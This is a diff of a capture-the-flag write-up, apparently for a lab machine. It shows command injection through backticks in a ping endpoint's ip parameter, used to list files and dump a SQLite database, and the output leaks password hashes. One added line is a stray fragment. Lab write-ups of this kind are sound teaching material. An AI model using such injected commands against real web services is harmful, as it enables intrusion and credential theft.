@@ -163,7 +163,7 @@ ping: /home/www/api: Temporary failure in name resolution
 - We can see that our wokring directory is /home/www/api
 - Now we can start looking around and trying to find the database filename. 
 - The next command im going to run is a simple ls
-	- http://10.10.90.74:8081/ping?ip=`ls`, this is the output:
+<p><span style="color:red">http://10.10.90.74:8081/ping?ip=`ls</span></p>
 <p><span style="color:green"><em>
 ping: utech.db.sqlite: Name or service not known 
 </em><</span></p>
@@ -171,7 +171,8 @@ ping: utech.db.sqlite: Name or service not known
 
 ### What is the first user's password hash?
 - To find the first user's password hash I belive we should try to look in the ultratech database file. To do this I will use the same method I did to find the database.
-	- http://10.10.90.74:8081/ping?ip=`cat utech.db.sqlite`
+lite`
+ <p><span style="color:red"> http://10.10.90.74:8081/ping?ip=`cat utech.db.sqlite</span></p>
  <p><span style="color:green"><em>
 ping: ) \ufffd\ufffd\ufffd(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
  </em></span></p>   
